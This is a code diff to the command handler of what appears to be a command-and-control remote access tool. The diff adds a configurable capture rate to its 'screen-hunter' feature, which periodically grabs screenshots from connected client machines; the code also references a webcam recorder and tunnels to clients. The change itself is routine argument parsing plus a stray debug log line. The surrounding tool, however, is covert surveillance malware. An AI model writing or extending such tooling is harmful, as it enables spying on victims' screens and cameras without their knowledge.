@@ -85,6 +85,7 @@ CommandHandler::CommandHandler(
     argument_list_.push_back(Argument(DEVICE_ARG, ARG_TYPE_INT, "-d", "--dev"));
     argument_list_.push_back(Argument(KB_LAYOUT_ARG, ARG_TYPE_STRING, "-l", "--layout"));
     argument_list_.push_back(Argument(CONVERT_ARG, ARG_TYPE_SET, "-c", "--convert"));
+    argument_list_.push_back(Argument(FPS_ARG, ARG_TYPE_FLOAT, "-fps", "--frames-per-second"));
 
     command_map_.emplace("help", Command(
         "Show this help message.\n\tFor specific command <command> -h/--help", 
@@ -154,10 +155,10 @@ CommandHandler::CommandHandler(
         {}
     ));
     command_map_.emplace("screen-hunter", Command(
-        "Start a screen hunter terminal between server and target with a specialized command line. Usage:\n\t screen-hunter -i <client_index>.\n\tscreen-hunter -rm -i <client_index> to stop the tunnel",
+        "Start the screen hunter terminal which will capture the screen frames in specific time intervals. Usage:\n\t screen-hunter -i <client_index>.\n\t-f <frames per second>. By default 0.2 (capture every 5 seconds)\n\tscreen-hunter -rm -i <client_index> to stop the tunnel",
         &CommandHandler::screen_hunter,
         this,
-        {HELP_ARG, REMOVE_ARG},
+        {HELP_ARG, REMOVE_ARG, FPS_ARG},
         {INDEX_ARG}
     ));
 }
@@ -221,6 +222,8 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
                     temp_arg_map[arg_num] = std::stoi(value);
                 } else if (arg_type == ARG_TYPE_STRING) {
                     temp_arg_map[arg_num] = value;
+                } else if (arg_type == ARG_TYPE_FLOAT) {
+                    temp_arg_map[arg_num] = std::stof(value);
                 } else {
                     *p_event_log_ << LOG_MUST << RED << "Unknown argument type for argument: " << arg << RESET_C2_FIFO;
                     return -1;
@@ -245,6 +248,7 @@ int CommandHandler::parse_arguments(const std::string& __root_cmd, const std::st
     std::find(command.required_.begin(), command.required_.end(), ALL_ARG) != command.required_.end()) {
         bool index_found = temp_arg_map.find(INDEX_ARG) != temp_arg_map.end();
         bool all_found = temp_arg_map.find(ALL_ARG) != temp_arg_map.end();
+        *p_event_log_ << LOG_MUST << RED << index_found << RESET_C2_FIFO;
 
         if (index_found && all_found) {
             *p_event_log_ << LOG_MUST << RED << "Cannot use both -i and -a arguments at the same time" << RESET_C2_FIFO;
@@ -662,6 +666,10 @@ void CommandHandler::webcam_recorder() {
 }
 
 void CommandHandler::screen_hunter() {
+    if (arg_map_.find(INDEX_ARG) == arg_map_.end()) {
+        *p_event_log_ << LOG_MUST << RED << "[CommandHandler::screen_hunter] Invalid usage. screen_hunter -h/--help for usage" << RESET_C2_FIFO;
+        return;
+    }
     int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
     Tunnel* p_tunnel = get_tunnel(client_index, SCREEN_HUNTER);
 
@@ -677,6 +685,13 @@ void CommandHandler::screen_hunter() {
     } else {
         if (p_tunnel == nullptr) {
             ScreenHunter* p_screen_hunter = new ScreenHunter();
+
+            float fps = 0.2;
+            if (arg_map_.find(FPS_ARG) != arg_map_.end()) {
+                fps = std::any_cast<float>(arg_map_[FPS_ARG]);
+            }
+
+            p_screen_hunter->set_fps(fps);
 
             Tunnel* tunnel = new Tunnel(client_index, SCREEN_HUNTER, p_screen_hunter);
             {
